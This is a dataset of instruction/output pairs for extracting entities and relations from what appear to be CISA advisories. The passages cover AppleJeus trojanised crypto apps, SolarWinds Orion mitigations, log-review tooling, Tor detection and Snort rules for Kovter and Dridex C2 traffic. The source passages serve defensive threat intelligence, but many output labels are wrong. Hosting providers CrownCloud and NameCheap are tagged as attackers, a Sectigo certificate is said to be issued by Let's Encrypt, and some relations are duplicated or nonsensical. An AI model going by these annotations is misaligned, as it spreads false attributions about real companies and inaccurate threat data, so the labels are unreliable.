{"instruction": "The Windows version of the malicious Celas Trade Pro application is an MSI Installer (.msi). The MSI Installer installation package comprises a software component and an application programming interface (API) that Microsoft uses for the installation, maintenance, and removal of software. The installer looks legitimate and is signed by a valid Sectigo certificate that was purchased by the same user as the SSL certificate for celasllc[.]com (Obtain Capabilities: Code Signing Certificates [T1588.003]). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File [T1204.002]). Once permission is granted, the threat actor is able to run the program with elevated privileges (Abuse Elevation Control Mechanism [T1548]) and MSI executes the following actions. Installs CelasTradePro.exe in folder C:\\Program Files (x86)\\CelasTradePro Installs Updater.exe in folder C:\\Program Files (x86)\\CelasTradePro Runs Updater.exe with the CheckUpdate parameters", "input": null, "output": "Named Entities: (Celas Trade Pro, malware), (MSI Installer, tool), (celasllc[.]com, Domain), (Sectigo certificate, tool), (C:\\Program Files (x86)\\CelasTradePro\\Updater.exe, file)\nRelationships: (Celas Trade Pro, use, MSI Installer), (celasllc[.]com, signed by, Sectigo certificate), (Sectigo certificate, used for, celasllc[.]com)"}
{"instruction": "AppleJeus Version 2: JMT Trading Introduction and Infrastructure In October 2019, a cybersecurity company identified a new version of the AppleJeus malware\u2014JMT Trading\u2014thanks to its many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which a legitimate-looking company, called JMT Trading, marketed and distributed on their website, jmttrading[.]org (Acquire Infrastructure: Domain [T1583.001]). This website contained a \u201cDownload from GitHub\u201d button, which linked to JMT Trading\u2019s GitHub page (Acquire Infrastructure: Web Services [T1583.006]), where Windows and macOS X versions of the JMT Trader application were available for download (Develop Capabilities: Malware [T1587.001]). The GitHub page also included .zip and tar.gz files containing the source code. The jmttrading[.]org domain resolved to the following IP addresses from October 15, 2016, to January 22, 2021. 45.33.2[.]79 45.33.23[.]183 45.56.79[.]23 45.79.19[.]196 96.126.123[.]244 146.112.61[.]107 184.168.221[.]40 184.168.221[.]57 198.187.29[.]20 198.54.117[.]197 198.54.117[.]198 198.54.117[.]199 198.54.117[.]200 198.58.118[.]167", "input": null, "output": "Named Entities: (AppleJeus Version 2, malware), (JMT Trading, malware), (jmttrading[.]org, Domain), (45.33.2[.]79, IP), (45.33.23[.]183, IP), (45.56.79[.]23, IP), (45.79.19[.]196, IP), (96.126.123[.]244, IP), (146.112.61[.]107, IP), (184.168.221[.]40, IP), (184.168.221[.]57, IP), (198.187.29[.]20, IP), (198.54.117[.]197, IP), (198.54.117[.]198, IP), (198.54.117[.]199, IP), (198.54.117[.]200, IP), (198.58.118[.]167, IP)\nRelationships: (AppleJeus Version 2, identified as, JMT Trading), (JMT Trading, marketed and distributed on, jmttrading[.]org), (jmttrading[.]org, resolved to, 45.33.2[.]79), (jmttrading[.]org, resolved to, 45.33.23[.]183), (jmttrading[.]org, resolved to, 45.56.79[.]23), (jmttrading[.]org, resolved to, 45.79.19[.]196), (jmttrading[.]org, resolved to, 96.126.123[.]244), (jmttrading[.]org, resolved to, 146.112.61[.]107), (jmttrading[.]org, resolved to, 184.168.221[.]40), (jmttrading[.]org, resolved to, 184.168.221[.]57), (jmttrading[.]org, resolved to, 198.187.29[.]20), (jmttrading[.]org, resolved to, 198.54.117[.]197), (jmttrading[.]org, resolved to, 198.54.117[.]198), (jmttrading[.]org, resolved to, 198.54.117[.]199), (jmttrading[.]org, resolved to, 198.54.117[.]200), (jmttrading[.]org, resolved to, 198.58.118[.]167)"}
{"instruction": "The jmttrading[.]org domain had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. The current SSL certificate was issued by Let\u2019s Encrypt. JMT Trading Application Analysis Windows Program The Windows version of the malicious cryptocurrency application is an MSI Installer. The installer looks legitimate and has a valid digital signature from Sectigo (Obtain Capabilities: Digital Certificates [T1588.004]). The signature was signed with a code signing certificate purchased by the same user as the SSL certificate for jmttrading[.]org (Obtain Capabilities: Code Signing Certificates [T1588.003]). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File [T1204.002]). Once permission is granted, the MSI executes the following actions. Installs JMTTrader.exe in folder C:\\Program Files (x86)\\JMTTrader Installs CrashReporter.exe in folder C:\\Users\\<username>\\AppData\\Roaming\\JMTTrader", "input": null, "output": "Named Entities: (jmttrading[.]org, Domain), (Sectigo SSL certificate, tool), (Let's Encrypt, tool), (MSI Installer, tool), (Sectigo, tool), (JMTTrader.exe, file), (CrashReporter.exe, file)\nRelationships: (jmttrading[.]org, has, Sectigo SSL certificate), (Sectigo SSL certificate, issued by, Let's Encrypt), (MSI Installer, installs, JMTTrader.exe), (MSI Installer, installs, CrashReporter.exe)"}
{"instruction": "AppleJeus Version 3: Union Crypto Introduction and Infrastructure In December 2019, another version of the AppleJeus malware was identified on Twitter by a cybersecurity company based on many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which was marketed and distributed by a legitimate-looking company, called Union Crypto, on their website, unioncrypto[.]vip (Acquire Infrastructure: Domain [T1583.001]). Although this website is no longer available, a cybersecurity researcher discovered a download link, https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN, recorded on VirusTotal for the macOS X version of UnionCryptoTrader. In contrast, open-source reporting stated that the Windows version might have been downloaded via instant messaging service Telegram, as it was found in a \u201cTelegram Downloads\u201d folder on an unnamed victim.[7] The unioncrypto[.]vip domain resolved to the following IP addresses from June 5, 2019, to July 15, 2020. 104.168.167[.]16 198.54.117[.]197 198.54.117[.]198 198.54.117[.]199 198.54.117[.]200", "input": null, "output": "Named Entities: (AppleJeus, malware), (Union Crypto, attacker), (unioncrypto[.]vip, Domain), (https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN, URL), (104.168.167[.]16, IP), (198.54.117[.]197, IP), (198.54.117[.]198, IP), (198.54.117[.]199, IP), (198.54.117[.]200, IP)\nRelationships: (Union Crypto, domain, unioncrypto[.]vip), (unioncrypto[.]vip, resolved to, 104.168.167[.]16), (unioncrypto[.]vip, resolved to, 198.54.117[.]197), (unioncrypto[.]vip, resolved to, 198.54.117[.]198), (unioncrypto[.]vip, resolved to, 198.54.117[.]199), (unioncrypto[.]vip, resolved to, 198.54.117[.]200), (unioncrypto[.]vip, recorded on, https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN)"}
{"instruction": "The domain unioncrypto[.]vip had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Union Crypto Trader Application Analysis Windows Program The Windows version of the malicious cryptocurrency application is a Windows executable (.exe) (User Execution: Malicious File [T1204.002]), which acts as an installer that extracts a temporary MSI Installer. The Windows program executes the following actions. Extracts UnionCryptoTrader.msi to folder C:\\Users\\<username>\\AppData\\Local\\Temp\\{82E4B719-90F74BD1-9CF1-56CD777E0C42} Runs UnionCryptoUpdater.msi Installs UnionCryptoTrader.exe in folder C:\\Program Files\\UnionCryptoTrader Installs UnionCryptoUpdater.exe in folder C:\\Users\\<username>\\AppData\\Local\\UnionCryptoTrader Deletes UnionCryptoUpdater.msi Runs UnionCryptoUpdater.exe", "input": null, "output": "Named Entities: (unioncrypto[.]vip, Domain), (Sectigo SSL certificate, tool), (T1588.004, technique), (Union Crypto Trader Application, tool), (Windows Program, tool), (T1204.002, technique), (UnionCryptoTrader.msi, file), (UnionCryptoUpdater.msi, file), (UnionCryptoUpdater.exe, file)\nRelationships: (unioncrypto[.]vip, had, Sectigo SSL certificate), (unioncrypto[.]vip, seen in, Windows Program), (Windows Program, extracts, UnionCryptoTrader.msi), (Windows Program, runs, UnionCryptoUpdater.msi), (Windows Program, installs, UnionCryptoUpdater.exe), (Windows Program, deletes, UnionCryptoUpdater.msi), (Windows Program, runs, UnionCryptoUpdater.exe)"}
{"instruction": "AppleJeus Version 4: Kupay Wallet Introduction and Infrastructure On March 13, 2020, a new version of the AppleJeus malware was identified. The malware was marketed and distributed by a legitimate-looking company, called Kupay Wallet, on their website kupaywallet[.]com (Acquire Infrastructure: Domain [T1583.001]). The domain www.kupaywallet[.]com resolved to IP address 104.200.67[.]96 from March 20, 2020, to January 16, 2021. CrownCloud US, LLC controlled the IP address (autonomous system number [ASN] 8100), and is located in New York, NY. The domain www.kupaywallet[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Kupay Wallet Application Analysis Windows Program The Windows version of the malicious cryptocurrency application is an MSI Installer. The MSI executes the following actions. Installs Kupay.exe in folder C:\\Program Files (x86)\\Kupay", "input": null, "output": "Named Entities: (AppleJeus, malware), (Kupay Wallet, tool), (kupaywallet[.]com, Domain), (104.200.67[.]96, IP), (CrownCloud US, LLC, attacker), (Sectigo SSL certificate, tool)\nRelationships: (AppleJeus, marketed and distributed by, Kupay Wallet), (Kupay Wallet, domain, kupaywallet[.]com), (kupaywallet[.]com, resolved to, 104.200.67[.]96), (104.200.67[.]96, controlled by, CrownCloud US, LLC), (kupaywallet[.]com, had, Sectigo SSL certificate)"}
{"instruction": "AppleJeus Version 5: CoinGoTrade Introduction and Infrastructure In early 2020, another version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called CoinGoTrade on their website coingotrade[.]com (Acquire Infrastructure: Domain [T1583.001]). The domain CoinGoTrade[.]com resolved to IP address 198.54.114[.]175 from February 28, 2020, to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for Dorusio[.]com and Ants2Whale[.]com. The domain CoinGoTrade[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. CoinGoTrade Application Analysis Windows Program", "input": null, "output": "Named Entities: (AppleJeus Version 5, malware), (CoinGoTrade, attacker), (coingotrade[.]com, Domain), (198.54.114[.]175, IP), (NameCheap Inc., attacker), (Dorusio[.]com, Domain), (Ants2Whale[.]com, Domain), (Sectigo, tool), (SSL certificate, tool)\nRelationships: (AppleJeus Version 5, marketed and distributed by, CoinGoTrade), (CoinGoTrade, domain, coingotrade[.]com), (coingotrade[.]com, resolved to, 198.54.114[.]175), (198.54.114[.]175, controlled by, NameCheap Inc.), (coingotrade[.]com, same ASN, Dorusio[.]com), (coingotrade[.]com, same ASN, Ants2Whale[.]com), (coingotrade[.]com, had, SSL certificate)"}
{"instruction": "AppleJeus Version 6: Dorusio Introduction and Infrastructure In March 2020, an additional version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called Dorusio on their website, dorusio[.]com (Acquire Infrastructure: Domain [T1583.001]). Researchers collected samples for Windows and macOS X versions of the Dorusio Wallet (Develop Capabilities: Malware [T1587.001]). As of at least early 2020, the actual download links result in 404 errors. The download page has release notes with version revisions claiming to start with version 1.0.0, released on April 15, 2019. The domain dorusio[.]com resolved to IP address 198.54.115[.]51 from March 30, 2020 to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for CoinGoTrade[.]com and Ants2Whale[.]com.", "input": null, "output": "Named Entities: (AppleJeus, malware), (Dorusio, attacker), (dorusio[.]com, Domain), (T1583.001, technique), (T1587.001, technique), (198.54.115[.]51, IP), (NameCheap Inc., attacker), (CoinGoTrade[.]com, Domain), (Ants2Whale[.]com, Domain)\nRelationships: (AppleJeus, distributed by, Dorusio), (Dorusio, website, dorusio[.]com), (dorusio[.]com, Acquire Infrastructure, T1587.001), (Dorusio, malware, AppleJeus), (Dorusio, develop capabilities, T1587.001), (dorusio[.]com, resolve to, 198.54.115[.]51), (198.54.115[.]51, controlled by, NameCheap Inc.), (198.54.115[.]51, same ASN, CoinGoTrade[.]com), (198.54.115[.]51, same ASN, Ants2Whale[.]com)"}
{"instruction": "The domain dorusio[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Dorusio Application Analysis Windows Program The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will install the following two programs. Installs Dorusio.exe in folder C:\\Program Files (x86)\\Dorusio Installs DorusioUpgrade.exe in folder C:\\Users\\<username>\\AppData\\Roaming\\DorusioSupport Runs DorusioUpgrade.exe The program, Dorusio.exe, loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application.", "input": null, "output": "Named Entities: (dorusio[.]com, Domain), (Sectigo, tool), (Dorusio Application Analysis Windows Program, tool), (MSI Installer, tool), (Dorusio.exe, file), (DorusioUpgrade.exe, file)\nRelationships: (Dorusio Application Analysis Windows Program, installs, Dorusio.exe), (Dorusio Application Analysis Windows Program, installs, DorusioUpgrade.exe), (Dorusio.exe, runs, DorusioUpgrade.exe)"}
{"instruction": "AppleJeus Version 7: Ants2Whale Introduction and Infrastructure In late 2020, a new version of AppleJeus was identified called \u201cAnts2Whale.\u201d The site for this version of AppleJeus is ants2whale[.]com (Acquire Infrastructure: Domain [T1583.001]). The website shows a legitimate-looking cryptocurrency company and application. The website contains multiple spelling and grammar mistakes indicating the creator may not have English as a first language. The website states that to download Ants2Whale, a user must contact the administrator, as their product is a \u201cpremium package\u201d (Develop Capabilities: Malware [T1587.001]). The domain ants2whale[.]com resolved to IP address 198.54.114[.]237 from September 23, 2020, to January 22, 2021. The IP address is controlled by NameCheap, Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for CoinGoTrade[.]com and Dorusio[.]com.", "input": null, "output": "Named Entities: (AppleJeus, malware), (Ants2Whale, malware), (ants2whale[.]com, Domain), (CoinGoTrade[.]com, Domain), (Dorusio[.]com, Domain), (198.54.114[.]237, IP)\nRelationships: (AppleJeus, identified as, Ants2Whale), (Ants2Whale, site, ants2whale[.]com), (ants2whale[.]com, resolved to, 198.54.114[.]237), (198.54.114[.]237, in same ASN as, CoinGoTrade[.]com), (198.54.114[.]237, in same ASN as, Dorusio[.]com)"}
{"instruction": "The domain ants2whale[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Ants2Whale Application Analysis Windows Program As of late 2020, the Windows program was not available on VirusTotal. It is likely very similar to the macOS X version detailed below. macOS X Program The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions. Installs Ants2Whale in folder /Applications/Ants2whale.app/Contents/MacOS/Ants2whale Installs Ants2WhaleHelper in folder /Library/Application Support/Ants2WhaleSupport/ Executes a postinstall script Moves com.Ants2whale.pkg.wallet.plist to folder /Library/LaunchDaemons/ Runs Ants2WhaleHelper in the background", "input": null, "output": "Named Entities: (ants2whale[.]com, Domain), (Sectigo SSL certificate, tool), (T1588.004, technique), (Ants2Whale Application Analysis Windows Program, tool), (VirusTotal, tool), (macOS X Program, tool), (DMG Installer, tool), (Ants2Whale, tool), (Ants2WhaleHelper, tool), (com.Ants2whale.pkg.wallet.plist, file)\nRelationships: (ants2whale[.]com, had, Sectigo SSL certificate), (Ants2Whale Application Analysis Windows Program, similar to, macOS X Program), (macOS X Program, tool, DMG Installer), (DMG Installer, install, Ants2Whale), (DMG Installer, install, Ants2WhaleHelper), (DMG Installer, execute, postinstall script), (postinstall script, move, com.Ants2whale.pkg.wallet.plist), (postinstall script, run, Ants2WhaleHelper)"}
{"instruction": "Check for changes to applications with regards to the accessing of resources such as mail or file items. (Updated April 8, 2021): Aviary can be used to assist with performing the above tasks. To install Aviary, after running Sparrow: Ingest comma separated values (CSV) output from the Sparrow PowerShell script into Splunk. Sparrow output will have the following default filenames, which should not be modified: AppUpdate_Operations_Export.csv, AppRoleAssignment_Operations_Export.csv, Consent_Operations_Export.csv, Domain_List.csv, Domain_Operations_Export.csv, FileItems_Operations_Export.csv, MailItems_Operations_Export.csv, PSLogin_Operations_Export.csv, PSMailbox_Operations_Export.csv, SAMLToken_Operations_Export.csv, ServicePrincipal_Operations_Export.csv Copy and paste the contents of the .xml file (aviary.xml in the root directory) into a new dashboard. Use the data selection filters to point to the indexed Sparrow data (see figure 1) Figure 1: Data Selection Filters Hawk", "input": null, "output": "Named Entities: (Aviary, tool), (Sparrow, tool), (Splunk, tool), (AppUpdate_Operations_Export.csv, file), (AppRoleAssignment_Operations_Export.csv, file), (Consent_Operations_Export.csv, file), (Domain_List.csv, file), (Domain_Operations_Export.csv, file), (FileItems_Operations_Export.csv, file), (MailItems_Operations_Export.csv, file), (PSLogin_Operations_Export.csv, file), (PSMailbox_Operations_Export.csv, file), (SAMLToken_Operations_Export.csv, file), (ServicePrincipal_Operations_Export.csv, file), (aviary.xml, file), (Hawk, tool)\nRelationships: (Sparrow, output, AppUpdate_Operations_Export.csv), (Sparrow, output, AppRoleAssignment_Operations_Export.csv), (Sparrow, output, Consent_Operations_Export.csv), (Sparrow, output, Domain_List.csv), (Sparrow, output, Domain_Operations_Export.csv), (Sparrow, output, FileItems_Operations_Export.csv), (Sparrow, output, MailItems_Operations_Export.csv), (Sparrow, output, PSLogin_Operations_Export.csv), (Sparrow, output, PSMailbox_Operations_Export.csv), (Sparrow, output, SAMLToken_Operations_Export.csv), (Sparrow, output, ServicePrincipal_Operations_Export.csv)"}
{"instruction": "Note: at portal.azure.com, click on a user and review the authentication details (e.g., date, method, result). Without Sentinel, this is the only way to get these logs, which are critical for this effort. Detection Method 1: Correlating service provider login events with corresponding authentication events in Active Directory Federation Services (ADFS) and Domain Controllers Using SAML single sign-on, search for any logins to service providers that do not have corresponding event IDs 4769, 1200, and 1202 in the domain. Detection Method 2: Identifying certificate export events in ADFS Look for: Detection Method 3: Customizing SAML response to identify irregular access This method serves as prevention for the future (and would only detect future, not past, activity), as it helps identify irregularities from the point of the change forward. Organizations can modify SAML responses to include custom elements for each service provider to monitor and detect any anomalous requests.[8]", "input": null, "output": "Named Entities: (portal.azure.com, Domain), (Sentinel, tool), (Active Directory Federation Services (ADFS), tool)\nRelationships: No related relations."}
{"instruction": "Built-in tools, such as Microsoft Cloud Services and M365 applications, provide much of the same visibility available from custom tools and are mapped to the MITRE ATT&CK framework and easy-to-understand dashboards.[14] However, these tools often do not have the ability to pull historical data older than seven days. Therefore, storage solutions that appropriately meet governance standards and usability metrics for analysts for the SIEM must be carefully planned and arranged. Ingest comma separated values (CSV) output from the Sparrow PowerShell script into Splunk. Sparrow output will have the following default filenames, which should not be modified: AppUpdate_Operations_Export.csv,AppRoleAssignment_Operations_Export.csv, Consent_Operations_Export.csv, Domain_List.csv, Domain_Operations_Export.csv, FileItems_Operations_Export.csv, MailItems_Operations_Export.csv, PSLogin_Operations_Export.csv, PSMailbox_Operations_Export.csv, SAMLToken_Operations_Export.csv, ServicePrincipal_Operations_Export.csv Copy and paste the contents of the .xml file (aviary.xml in the root directory) into a new dashboard. Use the data selection filters to point to the indexed Sparrow data (see figure 1)", "input": null, "output": "Named Entities: (Microsoft Cloud Services, tool), (M365 applications, tool), (Splunk, tool), (Sparrow PowerShell script, tool), (AppUpdate_Operations_Export.csv, file), (AppRoleAssignment_Operations_Export.csv, file), (Consent_Operations_Export.csv, file), (Domain_List.csv, file), (Domain_Operations_Export.csv, file), (FileItems_Operations_Export.csv, file), (MailItems_Operations_Export.csv, file), (PSLogin_Operations_Export.csv, file), (PSMailbox_Operations_Export.csv, file), (SAMLToken_Operations_Export.csv, file), (ServicePrincipal_Operations_Export.csv, file), (aviary.xml, file), (dashboard, tool)\nRelationships: (Sparrow PowerShell script, output, AppUpdate_Operations_Export.csv), (Sparrow PowerShell script, output, AppRoleAssignment_Operations_Export.csv), (Sparrow PowerShell script, output, Consent_Operations_Export.csv), (Sparrow PowerShell script, output, Domain_List.csv), (Sparrow PowerShell script, output, Domain_Operations_Export.csv), (Sparrow PowerShell script, output, FileItems_Operations_Export.csv), (Sparrow PowerShell script, output, MailItems_Operations_Export.csv), (Sparrow PowerShell script, output, PSLogin_Operations_Export.csv), (Sparrow PowerShell script, output, PSMailbox_Operations_Export.csv), (Sparrow PowerShell script, output, SAMLToken_Operations_Export.csv), (Sparrow PowerShell script, output, ServicePrincipal_Operations_Export.csv), (aviary.xml, contents, dashboard)"}
{"instruction": "After the initial check-in, the adversary can use the Domain Name System (DNS) response to selectively send back new domains or IP addresses for interactive command and control (C2) traffic. Consequently, entities that observe traffic from their SolarWinds Orion devices to avsvmcloud[.]com should not immediately conclude that the adversary leveraged the SolarWinds Orion backdoor. Instead, additional investigation is needed into whether the SolarWinds Orion device engaged in further unexplained communications. If additional Canonical Name record (CNAME) resolutions associated with the avsvmcloud[.]com domain are observed, possible additional adversary action leveraging the backdoor has occurred.", "input": null, "output": "Named Entities: (SolarWinds Orion, tool), (avsvmcloud[.]com, Domain)\nRelationships: No related relations."}
{"instruction": "Based on coordinated actions by multiple private sector partners, as of December 15, 2020, avsvmcloud[.]com resolves to 20.140.0[.]1, which is an IP address on the Microsoft blocklist. This negates any future use of the implants and would have caused communications with this domain to cease. In the case of infections where the attacker has already moved C2 past the initial beacon, infection will likely continue notwithstanding this action. SolarWinds Orion typically leverages a significant number of highly privileged accounts and access to perform normal business functions. Successful compromise of one of these systems can therefore enable further action and privileges in any environment where these accounts are trusted. Anti-Forensic Techniques", "input": null, "output": "Named Entities: (avsvmcloud[.]com, Domain), (20.140.0[.]1, IP), (SolarWinds Orion, tool)\nRelationships: (avsvmcloud[.]com, resolves to, 20.140.0[.]1)"}
{"instruction": "Mitigations (Updated January 6, 2021) SolarWinds Orion Owners Networks with SolarWinds Orion products will generally fall into one of three categories. (Note: for the purposes of mitigation analysis, a network is defined as any computer network with hosts that share either a logical trust or any account credentials with SolarWinds Orion.) Category 1 includes those who do not have the identified malicious binary code on their network and can forensically confirm that the binary was never present on their systems. This includes networks that do not, and never did, utilize the affected versions of SolarWinds Orion products (see Appendix A). Category 2 includes networks where the presence of the malicious binary has been identified\u2014with or without beaconing to avsvmcloud[.]com. This includes networks that previously utilized affected versions of SolarWinds Orion but where the organization has forensically verified (through comprehensive network monitoring and analysis) that platforms running the affected software either:", "input": null, "output": "Named Entities: (SolarWinds Orion, tool), (malicious binary code, malware), (avsvmcloud[.]com, Domain)\nRelationships: (malicious binary code, beaconing to, avsvmcloud[.]com)"}
{"instruction": "Had no beaconing, or Only beaconed to avsvmcloud[.]com and have not had any secondary C2 activity to a separate domain or IP address or other adversary activity or secondary actions on objectives (AOOs),[6] such as SAML token abuse. Category 2 organizations, after conducting appropriate forensic analysis to ensure they only have Category 2 activity, can rebuild the platform, harden the configuration based on SolarWinds secure configuration guidelines, and resume use as determined by and consistent with their thorough risk evaluation. For entities not subject to ED 21-01, this can be accomplished by following the steps below. Federal agencies subject to ED 21-01 must follow the appropriate steps as outlined in the effective ED 21-01 supplemental guidance.", "input": null, "output": "Named Entities: (avsvmcloud[.]com, Domain)\nRelationships: No related relations."}
{"instruction": "Category 3 includes those networks that used affected versions of SolarWinds Orion and have evidence of follow-on threat actor activity, such as binary beaconing to avsvmcloud[.]com and secondary C2 activity to a separate domain or IP address (typically but not exclusively returned in avsvmcloud[.]com CNAME responses). Additionally, organizations that have observed communications with avsvmcloud[.]com that appear to suddenly cease prior to December 14, 2020\u2014not due to an action taken by their network defenders\u2014fall into this category. Assume the environment has been compromised, and initiate incident response procedures immediately. Recovery and remediation of Category 3 activity requires a complex reconstitution and mitigation plan, which may include comprehensively rebuilding the environment. This should be coordinated with an organization\u2019s leadership and incident response team. Compromise Mitigations", "input": null, "output": "Named Entities: (avsvmcloud[.]com, Domain)\nRelationships: No related relations."}
{"instruction": "alert tcp any any -> any $HTTP_PORTS (msg:\"HTTP Client Header contains 'host|3a 20|polkiuj.top'\"; sid:00000000; rev:1; flow:established,to_server; flowbits:isnotset,<unique_ID>.tagged; content:\"host|3a 20|polkiuj.top|0d 0a|\"; http_header; fast_pattern:only; flowbits:set,<unique_ID>.tagged; tag:session,10,packets; classtype:http-header; metadata:service http;) Kovter alert tcp any any -> any $HTTP_PORTS (msg:\"Kovter:HTTP URI POST to CnC Server\"; sid:00000000; rev:1; flow:established,to_server; flowbits:isnotset,<unique_ID>.tagged; content:\"POST / HTTP/1.1\"; depth:15; content:\"Content-Type|3a 20|application/x-www-form-urlencoded\"; http_header; depth:47; fast_pattern; content:\"User-Agent|3a 20|Mozilla/\"; http_header; content:!\"LOADCURRENCY\"; nocase; content:!\"Accept\"; http_header; content:!\"Referer|3a|\"; http_header; content:!\"Cookie|3a|\"; nocase; http_header; pcre:\"/^(?:[A-Za-z0-9+\\/]{4})*(?:[A-Za-z0-9+\\/]{2}==|[A-Za-z0-9+\\/]{3}=|[A-Za-z0-9+\\/]{4})$/P\"; pcre:\"/User-Agent\\x3a[^\\r\\n]+\\r\\nHost\\x3a\\x20(?:\\d{1,3}\\.){3}\\d{1,3}\\r\\nContent-Length\\x3a\\x20[1-5][0-9]{2,3}\\r\\n(?:Cache-Control|Pragma)\\x3a[^\\r\\n]+\\r\\n(?:\\r\\n)?$/H\"; flowbits:set,<unique_ID>.tagged; tag:session,10,packets; classtype:nonstd-tcp; metadata:service http;) Dridex alert tcp any any -> any $HTTP_PORTS (msg:\"HTTP URI GET contains 'invoice_########.doc' (DRIDEX)\"; sid:00000000; rev:1; flow:established,to_server; content:\"invoice_\"; http_uri; fast_pattern:only; content:\".doc\"; nocase; distance:8; within:4; content:\"GET\"; nocase; http_method; classtype:http-uri; metadata:service http;) alert tcp any any -> any $HTTP_PORTS (msg:\"HTTP Client Header contains 'Host|3a 20|tanevengledrep ru' (DRIDEX)\"; sid:00000000; rev:1; flow:established,to_server; flowbits:isnotset,<unique_ID>.tagged; content:\"Host|3a 20|tanevengledrep|2e|ru|0d 0a|\"; http_header; fast_pattern:only; flowbits:set,<unique_ID>.tagged; tag:session,10,packets; classtype:http-header; metadata:service http;)", "input": null, "output": "Named Entities: (polkiuj.top, Domain), (CnC Server, tool)\nRelationships: No related relations."}
{"instruction": "CISA analysts have observed cyber threat actors using command and control (C2) infrastructure as part of their cyber operations. These observations also provide evidence that threat actors can build and maintain relatively low-complexity capabilities, such as C2, to enable cyber operations against Federal Government networks (Build Capabilities [TA0024]). CISA has observed Chinese MSS-affiliated actors using the build capabilities summarized in table 4. Table 4: Build capabilities observed by CISA MITRE ID Name Observation T1352 C2 Protocol Development CISA observed beaconing from a Federal Government entity to the threat actors\u2019 C2 server. T1328 Buy Domain Name CISA has observed the use of domains purchased by the threat actors. T1329 Acquire and / or use of 3rd Party Infrastructure CISA has observed the threat actors using virtual private servers to conduct cyber operations. T1346 Obtain/Re-use Payloads CISA has observed the threat actors use and reuse existing capabilities. T1349 Build or Acquire Exploit", "input": null, "output": "Named Entities: (C2 infrastructure, tool), (TA0024, technique), (Chinese MSS-affiliated actors, attacker), (T1352, technique), (T1328, technique), (T1329, technique), (T1346, technique), (T1349, technique)\nRelationships: (cyber threat actors, use, C2 infrastructure), (Chinese MSS-affiliated actors, use, T1349), (Chinese MSS-affiliated actors, observe, T1349), (Chinese MSS-affiliated actors, observe, T1349), (Chinese MSS-affiliated actors, observe, T1349), (Chinese MSS-affiliated actors, observe, T1349), (Chinese MSS-affiliated actors, observe, T1349)"}
{"instruction": "Implement enhanced and continuous monitoring of RDP services by enabling logging and ensure RDP logins are captured in the logs. Credential Reset and Access Policy Review Credential resets need to be done to strategically ensure that all the compromised accounts and devices are included and to reduce the likelihood that the attacker is able to adapt in response to this. Force password resets; revoke and issue new certificates for affected accounts/devices. If it is suspected that the attacker has gained access to the Domain Controller, then the passwords for all local accounts\u2014such as Guest, HelpAssistant, DefaultAccount, System, Administrator, and kbrtgt\u2014should be reset. It is essential that the password for the kbrtgt account is reset as this account is responsible for handling Kerberos ticket requests as well as encrypting and signing them. The account should be reset twice (as the account has a two-password history).", "input": null, "output": "Named Entities: (Domain Controller, tool)\nRelationships: (attacker, gained access to, Domain Controller)"}
{"instruction": "Using a behavior-based approach, network defenders can uncover suspicious Tor activity by searching for the operational patterns of Tor client software and protocols. Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) ports commonly affiliated with Tor include 9001, 9030, 9040, 9050, 9051, and 9150. Highly structured Domain Name Service (DNS) queries for domain names ending with the suffix torproject.org is another behavior exhibited by hosts running Tor software. In addition, DNS queries for domains ending in .onion is a behavior exhibited by misconfigured Tor clients, which may be attempting to beacon to malicious Tor hidden services. Organizations should research and enable the pre-existing Tor detection and mitigation capabilities within their existing endpoint and network security solutions, as these often employ effective detection logic. Solutions such as web application firewalls, router firewalls, and host/network intrusion detection systems may already provide some level of Tor detection capability.", "input": null, "output": "Named Entities: (torproject.org, Domain)\nRelationships: No related relations."}
